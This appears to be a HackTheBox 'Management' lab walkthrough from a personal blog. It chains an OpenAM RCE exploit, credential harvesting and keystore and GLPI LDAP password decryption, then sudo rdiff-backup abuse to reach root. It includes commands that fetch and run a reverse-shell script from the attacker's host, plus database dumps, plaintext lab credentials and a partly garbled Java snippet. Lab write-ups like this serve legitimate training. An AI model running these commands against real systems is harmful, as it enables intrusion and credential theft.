@@ -1,0 +1,697 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox Management Walkthrough - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="HackTheBox Management Walkthrough"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Executive Summary During the assessment of Management (10.129.50.209), an initial port scan revealed multiple exposed web, RMI, and LDAP services."><meta property="og:url" content="https://h4ck3rfirst.github.io/hackthebox-management-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;399b33d25e97aaafdf782ff626f536c4"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/hackthebox-management-walkthrough/"},"headline":"HackTheBox Management Walkthrough","datePublished":"2026-09-12T11:29+05:30","dateModified":"2026-10-05T11:31+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Executive Summary During the assessment of Management (10.129.50.209), an initial port scan revealed multiple exposed web, RMI, and LDAP services.","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>HackTheBox Management Walkthrough</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-09-12T11:29" class="feed__date">September 12, 2026</time></div></div></header></div><div class="entry-wrapper content__entry"><h2 id="executive-summary">Executive Summary</h2><p>During the assessment of <strong>Management (10.129.50.209)</strong>, an initial port scan revealed multiple exposed web, RMI, and LDAP services. An unauthenticated Remote Code Execution (RCE) vulnerability in the OpenAM instance allowed initial access as the <code>openam</code> user. Local enumeration uncovered plain-text and encrypted database credentials, leading to the decryption of an LDAP bind password via a custom standalone PHP script. Reusing these credentials provided SSH access as <code>owen</code>. Finally, local privilege escalation was achieved by exploiting a wild-card permission flag in a <code>sudo rdiff-backup</code> command, allowing arbitrary file read of <code>/root</code> and retrieving the root SSH private key.</p><h2 id="reconnaissance--enumeration">Reconnaissance &amp; Enumeration</h2><p>An initial full TCP port scan was performed to identify open services:</p><h3 id="nmap">nmap</h3><pre><code>nmap -A -min-rate=10000 -p- $vip  
+
+22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp    open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://10.129.47.152/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://management.htb/
+| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
+| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
+| Not valid before: 2026-06-02T01:21:44
+|_Not valid after:  2126-05-09T01:21:44
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+1689/tcp  open  java-rmi Java RMI
+| rmi-dumpregistry:
+|   org.opends.server.protocols.jmx.client-unknown
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @127.0.1.1:44929
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+4444/tcp  open  ssl/ldap
+| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
+| Not valid before: 2026-06-02T01:23:59
+|_Not valid after:  2046-05-28T01:23:59
+| fingerprint-strings:
+|   LDAPSearchReq:
+|     0&lt;0:
+|     objectClass1+
+|     ds-root-dse
+|_    ds-cfg-root-dse-backend0
+|_ssl-date: TLS randomness does not represent time
+44929/tcp open  java-rmi Java RMI
+50389/tcp open  ldap     (Anonymous bind OK)
+</code></pre><p><strong>Open Ports:</strong></p><ul><li><code>22/tcp</code> - SSH (OpenSSH 9.6p1)</li><li><code>80/tcp</code> / <code>443/tcp</code> - HTTP/HTTPS (nginx 1.24.0) — Redirects to <code>[https://management.htb/](https://management.htb/)</code></li><li><code>1689/tcp</code> / <code>44929/tcp</code> - Java RMI</li><li><code>4444/tcp</code> / <code>50389/tcp</code> - LDAP / SSL (OpenDS) — Hostname: <code>sso.management.htb</code></li><li><code>44929/tcp</code> / <code>java-rmi Java RMI</code> same as 1689</li><li><code>50389/tcp</code> / <code>ldap</code> (Anonymous bind OK) is <strong>false positive port</strong></li></ul><h2 id="enumeration">Enumeration</h2><h3 id="https">http/s</h3><h4 id="mainpage">mainpage</h4><p>80–&gt;443 <a href="https://management.htb/">https://management.htb/</a> Navigating to <code>https://management.htb/</code> and reviewing the source code revealed an encrypted asset path in JavaScript found : /assets/app.enc</p><pre><code>(function(){ var KEY=&quot;C+XDTUB0EuPY7BE+xzRcMP6dNjWd0h0GPxdt8tWSTVY=&quot;,FILE=&quot;assets/app.enc&quot;;
+</code></pre><h4 id="ssomanagementhtb">sso.management.htb</h4><p>Browsing <code>https://sso.management.htb</code> exposed an <strong>OpenAM</strong> login portal (<code>/openam/XUI/#login/</code>). The OpenAM instance was vulnerable to an unauthenticated password reset RCE endpoint (<code>/openam/ui/PWResetUserValidation</code>).</p><p>Executed the exploit payload to download and execute a reverse shell script: <a href="https://github.com/infernosalex/CVE-2026-33439-Python-PoC">POC</a> <code>exploit.py</code></p><pre><code>python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation  &#39;wget http://10.10.00.00:80/rev.sh | bash &#39;
+
+python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation  &#39;wget http://10.10.00.00:80/rev.sh -O /tmp/rev.sh ; chmod 777 /tmp/rev.sh ; /tmp/rev.sh&#39;
+</code></pre><pre><code>python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation  --proxy http://127.0.0.1:8080 &#39;&#39;
+</code></pre><h3 id="reverse-shell_openam">reverse shell_openam</h3><p>Caught the reverse shell connection as user <code>openam</code> (UID <code>996</code>):</p><pre><code>[+] [New Reverse Shell] =&gt; management 10.129.244.176 Linux-x86_64 👤 openam(996) 😍️ Session ID &lt;1&gt;
+(Penelope)&gt; sessions
+
+➤  management 10.129.244.176 Linux-x86_64
+
+    ID  | Shell | User        | Source
+    &lt;1&gt; | Raw   | openam(996) | TCPListener(0.0.0.0:12345)
+openam@management:/$ 
+</code></pre><h4 id="internal-credential-discovery-db">Internal Credential Discovery DB</h4><p>Inspecting GLPI configuration files yielded database credentials:</p><ul><li><strong>Path:</strong> <code>/opt/glpi/config/config_db.php</code></li><li><strong>MySQL Credentials:</strong> <code>glpi</code> : <code>8rhu0L6Pw4Y7</code></li></ul><pre><code>openam@management:/opt/glpi/config$ cat config_db.php
+
+&lt;?php
+class DB extends DBmysql {
+   public $dbhost = &#39;127.0.0.1&#39;;
+   public $dbuser = &#39;glpi&#39;;
+   public $dbpassword = &#39;8rhu0L6Pw4Y7&#39;;
+   public $dbdefault = &#39;glpidb&#39;;
+   public $use_utf8mb4 = true;
+   public $allow_datetime = false;
+   public $allow_signed_keys = false;
+</code></pre><h4 id="keystore-extraction-openam">KeyStore Extraction (OpenAM)</h4><p>Created a standalone Java utility (<code>/tmp/Extract.java</code>) to extract keys from <code>/opt/openam/config/openam/keystore.jceks</code> using <code>.storepass</code>:</p><ul><li><strong>Recovered Credentials:</strong><ul><li><code>dsameuserpwd</code>: <code>y1qJedqZosu2</code></li><li><code>configstorepwd</code>: <code>rCi5i6A7zqAf</code></li></ul></li></ul><pre><code>keytool -list -v -keystore /opt/openam/config/openam/keystore.jceks -storetype JCEKS -storepass S9n50IUgcRe1Lkj/7gp5OpdZHf1bphqh
+</code></pre><pre><code>openam@management:~/config$ cat &lt;&lt; &#39;EOF&#39; &gt; /tmp/Extract.java
+import java.io.FileInputStream;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.security.KeyStore;
+import javax.crypto.SecretKey;
+
+public class Extract {
+    public static void main(String[] args) {
+        try {
+            // Read and clean the passwords directly from files
+            String storePassStr = new String(Files.readAllBytes(Paths.get(&quot;/opt/openam/config/openam/.storepass&quot;))).trim();
+            String keyPassStr = new String(Files.readAllBytes(Paths.get(&quot;/opt/openam/config/openam/.keypass&quot;))).trim();
+
+            KeyStore ks = KeyStore.getInstance(&quot;JCEKS&quot;);
+            FileInputStream fis = new FileInputStream(&quot;/opt/openam/config/openam/keystore.jceks&quot;);
+            ks.load(fis, storePassStr.toCharArray());
+            fis.close();
+
+            String[] aliases = {&quot;dsameuserpwd&quot;, &quot;configstorepwd&quot;};
+
+            // Try using the .keypass file first
+            System.out.println(&quot;[*] Attempting decryption using .keypass file contents...&quot;);
+            for (String alias : aliases) {
+                try {
+                    SecretKey key = (SecretKey) ks.getKey(alias, keyPassStr.toCharArray());
+                    if (key != null) {
+                        System.out.println(&quot;[+] &quot; + alias + &quot;: &quot; + new String(key.getEncoded()));
+                    }
+                } catch (Exception e) {
+                    System.out.println(&quot;[-] Failed decrypting &quot; + alias + &quot; with .keypass.&quot;);
+                }
+java /tmp/Extract.javackTrace();rintln(&quot;[-] Failed decrypting &quot; + alias + &quot; with .storepass.&quot;););ts...&quot;);
+[*] Attempting decryption using .keypass file contents...
+[-] Failed decrypting dsameuserpwd with .keypass.
+[-] Failed decrypting configstorepwd with .keypass.
+
+[*] Attempting fallback decryption using .storepass file contents...
+[+] dsameuserpwd: y1qJedqZosu2
+[+] configstorepwd: rCi5i6A7zqAf
+</code></pre><h4 id="users-enumeration">Users Enumeration</h4><pre><code>openam@management:~$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+owen:x:1000:1000:Owen Castellan:/home/owen:/bin/bash
+</code></pre><h4 id="ss">ss</h4><pre><code>openam@management:/$ ss -ltup
+Netid  State   Recv-Q  Send-Q        Local Address:Port       Peer Address:Port Process
+udp    UNCONN  0       0                127.0.0.54:domain          0.0.0.0:*
+udp    UNCONN  0       0             127.0.0.53%lo:domain          0.0.0.0:*
+udp    UNCONN  0       0                   0.0.0.0:bootpc          0.0.0.0:*
+tcp    LISTEN  0       4096          127.0.0.53%lo:domain          0.0.0.0:*
+tcp    LISTEN  0       4096             127.0.0.54:domain          0.0.0.0:*
+tcp    LISTEN  0       511                 0.0.0.0:http            0.0.0.0:*
+tcp    LISTEN  0       4096                0.0.0.0:ssh             0.0.0.0:*
+tcp    LISTEN  0       511                 0.0.0.0:https           0.0.0.0:*
+tcp    LISTEN  0       80                127.0.0.1:mysql           0.0.0.0:*
+tcp    LISTEN  0       128                       *:50389                 *:*     users:((&quot;java&quot;,pid=1691,fd=492))
+tcp    LISTEN  0       50                        *:1689                  *:*     users:((&quot;java&quot;,pid=1691,fd=478))
+tcp    LISTEN  0       4096                   [::]:ssh                [::]:*
+tcp    LISTEN  0       1        [::ffff:127.0.0.1]:8005                  *:*     users:((&quot;java&quot;,pid=1691,fd=49))
+tcp    LISTEN  0       128                       *:4444                  *:*     users:((&quot;java&quot;,pid=1691,fd=491))
+tcp    LISTEN  0       100      [::ffff:127.0.0.1]:http-alt              *:*     users:((&quot;java&quot;,pid=1691,fd=44))
+tcp    LISTEN  0       50                        *:39641                 *:*     users:((&quot;java&quot;,pid=1691,fd=480))
+</code></pre><h4 id="sqldumping">sqldumping</h4><pre><code>openam@management:/$ mysql -u glpi -p8rhu0L6Pw4Y7 -e &#39;show databases;&#39;
+mysql -u glpi -p
+Enter password: 
+show databases;
+Database
+glpidb
+information_schema
+
+
+openam@management:/$ mysql -u glpi -p8rhu0L6Pw4Y7 -e &quot;SELECT name, password, api_token FROM glpi_users;&quot; glpidb
+
+mysql -u glpi -p8rhu0L6Pw4Y7 -e &quot;SELECT name, password, api_token FROM glpi_users;&quot; glpidb
+name       password                                                       api_token
+glpi       $2y$10$XbpKpVeQdlzK9Z6ld0aDUulxAS5s6Y.Lc/CtHldOVIlAKNqP7BY1G    NULL
+post-only  $2y$10$2.DfnJoLnGf4ZiFGMLHYiuVDMwMHKlvwbRvlXE6ZAxwzevQBqNOI2    NULL
+tech       $2y$10$qXRfoBja9A82RlrJLZuTB.NNVbTyRsjId4xMnthAwUCX/fNnuXoLe    NULL
+normal     $2y$10$vsU3M49DpDxr4rHFLzyU0.0mjYMqg1EtK4vY7e8E759SgDWAX208K    NULL
+</code></pre><p>Hashes is not crackable</p><h5 id="decrypting-glpi-ldap-passwords">Decrypting GLPI LDAP Passwords</h5><pre><code>openam@management:/opt/glpi$ mysql -u glpi -p8rhu0L6Pw4Y7 -e &quot;SELECT * FROM glpi_authldaps\G&quot; glpidb
+*************************** 1. row ***************************
+                       id: 1
+                     name: Management Directory
+                     host: sso.management.htb
+                   basedn: dc=management,dc=htb
+                   rootdn: cn=svc-glpi,ou=services,dc=management,dc=htb
+                     port: 389
+                condition: NULL
+              login_field: uid
+               sync_field: uid
+                  use_tls: 0
+              group_field: NULL
+          group_condition: NULL
+        group_search_type: 0
+       group_member_field: NULL
+             email1_field: NULL
+           realname_field: NULL
+          firstname_field: NULL
+              phone_field: NULL
+             phone2_field: NULL
+             mobile_field: NULL
+            comment_field: NULL
+                   use_dn: 1
+              time_offset: 0
+             deref_option: 0
+              title_field: NULL
+           category_field: NULL
+           language_field: NULL
+                 date_mod: 2026-06-02 01:25:41
+                  comment: Primary directory bind used to synchronise managed client accounts.
+               is_default: 0
+                is_active: 1
+            rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
+registration_number_field: NULL
+             email2_field: NULL
+             email3_field: NULL
+             email4_field: NULL
+           location_field: NULL
+        responsible_field: NULL
+                 pagesize: 0
+            ldap_maxlimit: 0
+     can_support_pagesize: 0
+            picture_field: NULL
+         begin_date_field: NULL
+           end_date_field: NULL
+            date_creation: 2026-06-02 01:25:41
+         inventory_domain: NULL
+             tls_certfile: NULL
+              tls_keyfile: NULL
+                 use_bind: 1
+                  timeout: 10
+              tls_version: NULL
+</code></pre><p>The encrypted string is stored inside the <strong><code>glpi_authldaps</code></strong> table under the <strong><code>rootdn_passwd</code></strong> column.</p><p>Extracted encrypted LDAP bind credentials from GLPI database (<code>glpidb.glpi_authldaps</code>):</p><ul><li><strong>DN:</strong> <code>cn=svc-glpi,ou=services,dc=management,dc=htb</code></li><li><strong>Encrypted String:</strong> <code>avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==</code></li></ul><p>Using the cryptographic key located in <code>/opt/glpi/config/glpicrypt.key</code>, a custom PHP script utilizing Libsodium (<code>sodium_crypto_aead_xchacha20poly1305_ietf_decrypt</code>) was executed to decrypt the secret:</p><pre><code>&lt;?php
+$key = file_get_contents(&#39;/opt/glpi/config/glpicrypt.key&#39;);
+$encrypted_base64 = &quot;avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==&quot;;
+$ciphertext = base64_decode($encrypted_base64);
+
+$nonce_len = SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES;
+$nonce = substr($ciphertext, 0, $nonce_len);
+$encrypted_data = substr($ciphertext, $nonce_len);
+
+$decrypted = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($encrypted_data, $nonce, $nonce, $key);
+echo &quot;Decrypted Password: &quot; . $decrypted . &quot;\n&quot;;
+?&gt;
+
+openam@management:/opt/glpi$ php /tmp/glpi_standalone.php
+
+php /tmp/glpi_standalone.php
+Decrypted Password: WpczC40GhTbk
+</code></pre><p><strong>Decrypted LDAP / Service Password:</strong> <code>WpczC40GhTbk</code></p><h2 id="usertxt">User.txt</h2><p>Using password reuse, authenticated via SSH as user <code>owen</code>:</p><h3 id="ssh-as-owen">ssh as owen</h3><pre><code>└─$ ssh owen@management.htb
+owen@management.htb&#39;s password:
+
+owen@management:~$ ls
+user.txt
+</code></pre><h2 id="privilege-escalation">Privilege escalation</h2><p>Checking sudo rights (<code>sudo -l</code>):</p><pre><code>
+owen@management:~$ sudo -l
+Matching Defaults entries for owen on management:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User owen may run the following commands on management:
+    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
+owen@management:~$
+</code></pre><p>wildcard at the end means you can append <strong>any arbitrary flags</strong> when executing the command via <code>sudo</code>.</p><h4 id="arbitrary-file-read-exploit">Arbitrary File Read Exploit</h4><p>Leveraged <code>--remote-schema</code> combined with <code>rdiff-backup</code> to mirror the contents of <code>/root</code> into <code>/tmp/root</code>:</p><pre><code>rdiff-backup --remote-schema &#39;sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s&#39; backup /::/root /tmp/rootbak
+</code></pre><p>output give me the mirrror path of root folder</p><pre><code>owen@management:/tmp/rootba$ rdiff-backup --remote-schema &#39;sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s&#39; backup /::/root /tmp/root
+WARNING: this command line interface is deprecated and will disappear, start using the new one as described with &#39;--new --help&#39;.
+WARNING: Server will be called with deprecated command line interface to guarantee compatibility. It might lead to a deprecation warning from newer rdiff-backup versions. Use &#39;--api-version 201&#39; (or higher) to avoid it.
+NOTE: Starting mirror from source path /root to destination path /tmp/root
+</code></pre><h4 id="root-session-establishment">Root Session Establishment</h4><p>Navigated to <code>/tmp/root/.ssh</code> and extracted <code>id_ed25519</code>. Authenticated locally as root:</p><pre><code>owen@management:/tmp/root$ ls -lhas
+total 44K
+4.0K drwx------  7 owen owen 4.0K Sep 25 10:57 .
+4.0K drwxrwxrwt 20 root root 4.0K Sep 25 16:09 ..
+   0 lrwxrwxrwx  1 owen owen    9 Sep 25 16:09 .bash_history -&gt; /dev/null
+4.0K -rw-r--r--  1 owen owen 3.1K Apr 22  2024 .bashrc
+4.0K drwx------  3 owen owen 4.0K Sep  7 11:41 .cache
+4.0K drwx------  3 owen owen 4.0K Sep  7 11:41 .config
+4.0K drwxr-xr-x  3 owen owen 4.0K Sep  7 11:41 .local
+4.0K -rw-r--r--  1 owen owen  161 Apr 22  2024 .profile
+4.0K drwx------  3 owen owen 4.0K Sep 25 16:09 rdiff-backup-data
+4.0K -rw-r-----  1 owen owen   33 Sep 25 10:57 root.txt
+4.0K drwx------  2 owen owen 4.0K Sep  7 11:41 .ssh
+4.0K -rw-r--r--  1 owen owen  177 Sep  7 11:06 .wget-hsts
+</code></pre><p>suing ssh priviate key i loged with root</p><pre><code>owen@management:/tmp/root/.ssh$ ssh -i id_ed25519 root@127.0.0.1
+The authenticity of host &#39;127.0.0.1 (127.0.0.1)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:1: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;127.0.0.1&#39; (ED25519) to the list of known hosts.
+Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-139-generic x86_64)
+
+root@management:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@management:~#
+</code></pre><h2 id="roottxt_done">root.txt_done</h2></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on October 5, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/cracking/">cracking</a></li><li><a href="https://h4ck3rfirst.github.io/tags/easy/">Easy</a></li><li><a href="https://h4ck3rfirst.github.io/tags/glpi-ldap/">GLPI ldap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/hackthebox/">hackthebox</a></li><li><a href="https://h4ck3rfirst.github.io/tags/htb/">htb</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ldap/">ldap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/openam/">OpenAM</a></li><li><a href="https://h4ck3rfirst.github.io/tags/subdomain/">subdomain</a></li><li><a href="https://h4ck3rfirst.github.io/tags/sudo-l/">sudo -l</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-management-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%20Management%20Walkthrough&amp;url=https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-management-walkthrough%2F" class="js-share buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%20Management%20Walkthrough https%3A%2F%2Fh4ck3rfirst.github.io%2Fhackthebox-management-walkthrough%2F" class="js-share whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" rel="author">h4ck3rfirst</a></h3></div></div></div></footer></article><div class="content__related related"><div class="wrapper"><h2 class="h4 related__title">You should also read:</h2><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-03-02T18:36" class="feed__date">March 2, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/tryhackme-lookup-walkthrough/">Tryhackme Lookup Walkthrough</a></h3></header><p>tags: [ctf, enumeration, exploit, Lookup, writeups, htb, writeups, tryhackme, Linux, wordpress, cracking, walkthrough] Welcome to the walkthrough for the Lookup&hellip;</p></div></article><article class="feed__item feed__item--centered"><figure class="feed__image related__image"><img src="https://h4ck3rfirst.github.io/media/posts/12/soulmate.jpg" srcset="https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-xs.jpg 640w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-sm.jpg 768w, https://h4ck3rfirst.github.io/media/posts/12/responsive/soulmate-md.jpg 1024w" sizes="(min-width: 600px) calc(4.38vw + 143px), 87.86vw" loading="lazy" height="300" width="300" alt=""></figure><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-11T23:23" class="feed__date">September 11, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-soulmate-walkthrough/">HackTheBox Soulmate Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine ‘Soulmate hackthebox HackTheBox — Soulmate Writeup Difficulty: Easy OS: Linux IP: 10.10.11.85&hellip;</p></div></article><article class="feed__item feed__item--centered"><div class="feed__content"><header><div class="feed__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-09-21T18:18" class="feed__date">September 21, 2025</time></div><h3 class="feed__title"><a href="https://h4ck3rfirst.github.io/hackthebox-expressway-walkthrough/">HackTheBox Expressway Walkthrough</a></h3></header><p>Complete walkthrough of the HackTheBox Pentest Lab machine Expressway ┌──(kali㉿kali)-[/media/sf_shared/ctf/hackthebox/expressway] └─$ rustscan -a 10.10.11.87 .----. .-. .-. .----..---. .----. .---.</p></div></article></div></div></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><h6>Documenting the world of bug bounties, pentesting, and security engineering one lab at a time.</h6><p class="align-center">© 2026 h4ck3rfirst . Built with 😊.</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://h4ck3rfirst.github.io/assets/js/scripts.min.js?v&#x3D;dafec4f87fead6718cb125f0b0fc8441"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
+        for (var i = 0; i < images.length; i++) {
+            if (images[i].complete) {
+                images[i].classList.add('is-loaded');
+            } else {
+                images[i].addEventListener('load', function () {
+                    this.classList.add('is-loaded');
+                }, false);
+            }
+        }</script><script>(function () {
+    "use strict";
+
+    const space = document.getElementById("publii-space-dust");
+
+    if (!space) return;
+
+    /* ================================
+       SETTINGS
+       ================================ */
+
+    const STAR_COUNT = 1200;
+
+    /*
+     * Approximately 2 cm on a typical desktop display.
+     * CSS pixels are not physically exact across monitors,
+     * so this is an approximate interaction radius.
+     */
+    const MOUSE_RADIUS = 75;
+
+    /* How fast the dust moves */
+    const MIN_SPEED = 0.99;
+    const MAX_SPEED = 2.99;
+
+    /* How often stars twinkle */
+    const MIN_TWINKLE = 0.9;
+    const MAX_TWINKLE = 2.8;
+
+    /* ================================
+       VARIABLES
+       ================================ */
+
+    const stars = [];
+    let mouseX = -9999;
+    let mouseY = -9999;
+    let animationFrame;
+
+    const glow = document.getElementById(
+        "publii-space-mouse-glow"
+    );
+
+    /* ================================
+       RANDOM HELPERS
+       ================================ */
+
+    function random(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function clamp(value, min, max) {
+        return Math.max(min, Math.min(max, value));
+    }
+
+    /* ================================
+       CREATE STARS
+       ================================ */
+
+    for (let i = 0; i < STAR_COUNT; i++) {
+
+        const star = document.createElement("span");
+
+        star.className = "publii-star";
+
+        /*
+         * Most particles are tiny.
+         * A few are slightly larger.
+         */
+        const sizeChance = Math.random();
+
+        let size;
+
+        if (sizeChance > 0.992) {
+            size = random(3.0, 4.5);
+            star.classList.add("big");
+        } else if (sizeChance > 0.96) {
+            size = random(1.8, 3.2);
+        } else if (sizeChance > 0.82) {
+          // Normal stars
+    	size = random(1.0, 1.8);
+		} else {
+    	// Tiny space dust
+    	size = random(0.4, 1.1);
+		}
+
+        star.style.width = size + "px";
+        star.style.height = size + "px";
+
+        const x = Math.random() * window.innerWidth;
+        const y = Math.random() * window.innerHeight;
+
+        star.style.left = x + "px";
+        star.style.top = y + "px";
+
+        /*
+         * Each particle gets its own direction
+         * and speed so the background feels like dust.
+         */
+        const angle = random(0, Math.PI * 2);
+
+        const speed = random(
+            MIN_SPEED,
+            MAX_SPEED
+        );
+
+        /*
+         * Twinkle timing
+         */
+        const twinkleDuration = random(
+            MIN_TWINKLE,
+            MAX_TWINKLE
+        );
+
+        const twinkleDelay = random(
+            0,
+            MAX_TWINKLE
+        );
+
+        star.style.animation =
+            "publiiStarTwinkle " +
+            twinkleDuration +
